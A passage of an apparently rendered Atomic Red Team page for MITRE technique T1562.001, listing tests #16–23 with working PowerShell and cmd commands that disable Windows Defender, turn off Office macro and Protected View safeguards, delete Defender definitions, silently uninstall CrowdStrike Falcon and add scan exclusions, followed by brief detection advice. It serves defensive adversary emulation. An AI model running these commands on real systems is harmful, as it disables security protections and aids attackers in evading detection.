+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="n">DisableAntiSpyware</span> <span class="n">-Value</span> <span class="n">1</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">16</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-17-disable-microsoft-office-security-features">
+<h3>Atomic Test #17 - Disable Microsoft Office Security Features<a class="headerlink" href="#atomic-test-17-disable-microsoft-office-security-features" title="Permalink to this headline">¶</a></h3>
+<p>Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
+show any warning before editing the document.</p>
+<p>https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id14">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel&quot;</span>
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security&quot;</span>
+<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;VBAWarnings&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableInternetFilesInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableUnsafeLocationsInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
+<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAttachementsInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">17</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-18-remove-windows-defender-definition-files">
+<h3>Atomic Test #18 - Remove Windows Defender Definition Files<a class="headerlink" href="#atomic-test-18-remove-windows-defender-definition-files" title="Permalink to this headline">¶</a></h3>
+<p>Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
+On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
+command will say completed.</p>
+<p>https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id15">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">18</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-19-stop-and-remove-arbitrary-security-windows-service">
+<h3>Atomic Test #19 - Stop and Remove Arbitrary Security Windows Service<a class="headerlink" href="#atomic-test-19-stop-and-remove-arbitrary-security-windows-service" title="Permalink to this headline">¶</a></h3>
+<p>Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id16">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Stop-Service</span> <span class="n">-Name</span> <span class="c">#{service_name}</span>
+<span class="nb">Remove-Service</span> <span class="n">-Name</span> <span class="c">#{service_name}</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">19</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-20-uninstall-crowdstrike-falcon-on-windows">
+<h3>Atomic Test #20 - Uninstall Crowdstrike Falcon on Windows<a class="headerlink" href="#atomic-test-20-uninstall-crowdstrike-falcon-on-windows" title="Permalink to this headline">¶</a></h3>
+<p>Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id17">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="s2">&quot;#{falcond_path}&quot;</span><span class="p">)</span> <span class="p">{.</span> <span class="s2">&quot;#{falcond_path}&quot;</span> <span class="p">/</span><span class="n">repair</span> <span class="p">/</span><span class="n">uninstall</span> <span class="p">/</span><span class="n">quiet</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="s2">&quot;C:\ProgramData\Package Cache&quot;</span> <span class="n">-Include</span> <span class="s2">&quot;WindowsSensor.exe&quot;</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$sig</span><span class="p">=$(</span><span class="nb">Get-AuthenticodeSignature</span> <span class="n">-FilePath</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$sig</span><span class="p">.</span><span class="n">Status</span> <span class="o">-eq</span> <span class="s2">&quot;Valid&quot;</span> <span class="o">-and</span> <span class="nv">$sig</span><span class="p">.</span><span class="n">SignerCertificate</span><span class="p">.</span><span class="n">DnsNameList</span> <span class="o">-eq</span> <span class="s2">&quot;CrowdStrike, Inc.&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="p">.</span> <span class="s2">&quot;$_&quot;</span> <span class="p">/</span><span class="n">repair</span> <span class="p">/</span><span class="n">uninstall</span> <span class="p">/</span><span class="n">quiet</span><span class="p">;</span> <span class="k">break</span><span class="p">;}}}```</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">20</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-21-tamper-with-windows-defender-evade-scanning-folder">
+<h3>Atomic Test #21 - Tamper with Windows Defender Evade Scanning -Folder<a class="headerlink" href="#atomic-test-21-tamper-with-windows-defender-evade-scanning-folder" title="Permalink to this headline">¶</a></h3>
+<p>Malware can exclude a specific path from being scanned and evading detection.
+Upon successul execution, the file provided should be on the list of excluded path.
+To check the exclusion list using poweshell (Get-MpPreference).ExclusionPath</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id18">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedpath</span><span class="p">=</span> <span class="s2">&quot;#{excluded_folder}&quot;</span>
+<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionPath</span> <span class="nv">$excludedpath</span><span class="p">```</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">21</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-22-tamper-with-windows-defender-evade-scanning-extension">
+<h3>Atomic Test #22 - Tamper with Windows Defender Evade Scanning -Extension<a class="headerlink" href="#atomic-test-22-tamper-with-windows-defender-evade-scanning-extension" title="Permalink to this headline">¶</a></h3>
+<p>Malware can exclude specific extensions from being scanned and evading detection.
+Upon successful execution, the extension(s) should be on the list of excluded extensions.
+To check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id19">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id19" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedExts</span><span class="p">=</span> <span class="s2">&quot;#{excluded_exts}&quot;</span>
+<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionExtension</span>  <span class="nv">$excludedExts</span><span class="p">```</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">22</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="atomic-test-23-tamper-with-windows-defender-evade-scanning-process">
+<h3>Atomic Test #23 - Tamper with Windows Defender Evade Scanning -Process<a class="headerlink" href="#atomic-test-23-tamper-with-windows-defender-evade-scanning-process" title="Permalink to this headline">¶</a></h3>
+<p>Malware can exclude specific processes from being scanned and evading detection.
+Upon successful execution, the process(es) should be on the list of excluded processes.
+To check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.”</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="id20">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$excludedProcess</span> <span class="p">=</span> <span class="s2">&quot;#{excluded_process}&quot;</span>
+<span class="nb">Add-MpPreference</span> <span class="n">-ExclusionProcess</span> <span class="nv">$excludedProcess</span><span class="p">```</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1562</span><span class="o">.</span><span class="mi">001</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">23</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="detection">
+<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
+<p>Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log events may be suspicious.</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: ".net-powershell"
+        },
+        kernelOptions: {
+            kernelName: ".net-powershell",
+            path: "./tactics/defense-evasion"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = '.net-powershell'</script>
+
+              </div>
+              
+        </div>
+    </div>
+    
+    
+    <div class='prev-next-bottom'>
+        
+    <a class='left-prev' id="prev-link" href="T1036.html" title="previous page">T1036 - Masquerading</a>
+    <a class='right-next' id="next-link" href="T1542.html" title="next page">T1542 - Pre-OS Boot</a>
+
+    </div>
+    <footer class="footer mt-5 mt-md-0">
+    <div class="container">
+      <p>
+        
+          By Hare Sudhan Muthusamy<br/>
+        
+            &copy; Copyright 2020.<br/>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+
+    <script src="../../_static/js/index.js"></script>
+    
+  </body>
+</html>
